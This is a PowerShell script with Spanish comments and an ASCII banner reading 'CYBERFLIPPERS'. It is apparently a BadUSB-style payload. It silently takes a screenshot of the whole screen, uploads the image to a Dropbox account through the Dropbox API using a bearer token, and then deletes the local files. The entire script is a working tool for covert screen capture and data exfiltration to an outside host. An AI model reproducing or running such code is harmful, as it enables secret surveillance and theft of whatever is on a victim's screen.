# Define el token de acceso de Dropbox
$db = ""

# Función para mostrar el encabezado artístico
function Show-Header {
    $header = @"
########################################################################################################################
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
 #########################################################################################################################           
"@
    return $header
}

# Función para subir archivos a Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True)]
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = @{
        "Authorization" = $authorization
        "Dropbox-API-Arg" = $arg
        "Content-Type" = 'application/octet-stream'
    }

    # Añadir encabezado al contenido del archivo
    $header = Show-Header
    $fileContent = Get-Content -Path $SourceFilePath -Raw
    $combinedContent = $header + "`r`n" + $fileContent
    $tempFilePath = [System.IO.Path]::GetTempFileName()
    Set-Content -Path $tempFilePath -Value $combinedContent

    # Subir el archivo a Dropbox
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $tempFilePath -Headers $headers

    # Limpiar el archivo temporal
    Remove-Item -Path $tempFilePath -Force
}

# Función para capturar la pantalla
function Capture-Screen {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
    $filePath = "$env:temp\sc.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $filePath
}

try {
    # Capturar la pantalla y obtener la ruta del archivo
    $screenshotPath = Capture-Screen

    # Subir la captura de pantalla a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -SourceFilePath $screenshotPath
    } else {
        Write-Error "No se proporcionó el token de acceso de Dropbox."
    }

    # Limpiar el archivo de captura de pantalla
    Remove-Item -Path $screenshotPath -Force
}
catch {
    Write-Error "Ocurrió un error: $_"
}
